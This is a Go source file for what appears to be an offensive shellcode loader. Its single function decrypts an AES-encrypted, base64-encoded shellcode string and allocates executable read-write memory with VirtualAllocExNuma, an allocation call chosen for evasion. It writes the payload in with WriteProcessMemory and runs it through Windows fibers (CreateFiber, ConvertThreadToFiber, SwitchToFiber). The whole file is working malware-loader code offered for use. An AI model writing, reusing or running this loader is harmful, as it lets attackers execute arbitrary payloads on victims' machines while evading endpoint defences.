package fibers_v2

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procCreateFiber          = kernel32.NewProc("CreateFiber")
	procConvertThreadToFiber = kernel32.NewProc("ConvertThreadToFiber")
	procSwitchToFiber        = kernel32.NewProc("SwitchToFiber")
	procGetLastError         = kernel32.NewProc("GetLastError")
	procVirtualAllocExNuma   = kernel32.NewProc("VirtualAllocExNuma")
	procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NUMA_NODE              = 0
)

func ShellcodeFibers(Shellcode string, password string) {
	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
	key, _ := base64.StdEncoding.DecodeString(password)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	// Get the current process handle
	handle, _ := syscall.GetCurrentProcess()

	// Allocate executable memory using VirtualAllocExNuma
	codeAddr, _, _ := procVirtualAllocExNuma.Call(
		uintptr(handle),         // Process handle
		0,                       // Let the system determine where to allocate the memory
		uintptr(len(plaintext)), // Size of the memory region
		MEM_COMMIT|MEM_RESERVE,  // Allocation type
		PAGE_EXECUTE_READWRITE,  // Memory protection
		NUMA_NODE,               // Preferred NUMA node
	)

	if codeAddr == 0 {
		lastError, _, _ := procGetLastError.Call()
		fmt.Printf("[!] VirtualAllocExNuma Failed With Error: %d \n", lastError)
		return
	}

	// Copy the code to the allocated memory using WriteProcessMemory
	var writtenBytes uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		uintptr(handle),                        // Process handle
		codeAddr,                               // Address of the allocated memory
		uintptr(unsafe.Pointer(&plaintext[0])), // Pointer to the data to write
		uintptr(len(plaintext)),                // Size of the data
		uintptr(unsafe.Pointer(&writtenBytes)), // Variable to receive the number of bytes written
	)

	if ret == 0 {
		fmt.Println("[!] WriteProcessMemory failed")
		return
	}

	// Create a fiber to execute the code
	monkeyFiber, _, _ := procCreateFiber.Call(0, codeAddr, 0)
	if monkeyFiber == 0 {
		lastError, _, _ := procGetLastError.Call()
		fmt.Printf("[!] CreateFiber Failed With Error: %d \n", lastError)
		return
	}

	// Convert the current thread to a fiber
	primaryFiberAddress, _, _ := procConvertThreadToFiber.Call(0)
	if primaryFiberAddress == 0 {
		lastError, _, _ := procGetLastError.Call()
		fmt.Printf("[!] ConvertThreadToFiber Failed With Error: %d \n", lastError)
		return
	}

	fmt.Printf("[+] Fiber V2 Executed")
	// Switch to the shellcode fiber
	procSwitchToFiber.Call(monkeyFiber)
}
